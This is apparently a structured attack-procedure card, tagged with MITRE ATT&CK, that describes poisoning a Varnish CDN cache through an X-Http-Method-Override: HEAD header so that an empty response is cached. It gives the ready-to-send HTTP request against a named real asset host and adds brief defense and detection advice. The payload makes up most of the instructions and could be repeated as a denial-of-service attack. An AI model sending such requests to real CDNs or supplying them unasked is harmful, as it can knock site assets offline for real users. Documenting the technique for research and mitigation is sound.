---
id: proc-2
tags:
  - cache-poisoning
  - dos
  - header-injection
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
  - Cloud (GCP)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:56.043Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# Send-Poisoned-GET-with-X-Http-Method-Override

## Summary

This procedure poisons a Varnish cache entry by sending a GET request with the X-Http-Method-Override: HEAD header, causing GCP to return an empty response that gets cached, using a cache buster to avoid live impact during testing.

## Description

The attack leverages GCP's acceptance of X-Http-Method-Override to convert a GET to HEAD, producing an empty body. Varnish, not including the header in its cache key, caches this empty response for the resource variant. This is tested with a unique query parameter to isolate effects, preparing for full DoS in web CDNs.

## Requirements

1. HTTP client supporting custom headers (e.g., curl)
2. Access to the target CDN endpoint
3. Unique cache buster value to prevent live pollution

## Defense

Defensive measures and detection strategies:

- Configure Varnish to include X-Http-Method-Override in cache keys or strip it
- Log and alert on HEAD-like responses to GET endpoints on CDN

## Objectives

1. Inject empty response into cache via method override
2. Validate poisoning without affecting production users
3. Demonstrate header-based cache manipulation

## Instructions

### Step 1: Send Poisoning Request

**Context**: Use the override header to trick the backend while keeping the request as GET for Varnish.

Send the following HTTP request:

```http
GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.chunk.js?cb=youstin-xyz HTTP/1.1
Host: assets.gitlab-static.net
X-Http-Method-Override: HEAD
```

> Expected output: HTTP 200 with empty body, as the backend treats it as HEAD. Varnish caches this due to matching URL but ignores the header.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[cache-poisoning]]
- [[dos]]
- [[header-injection]]
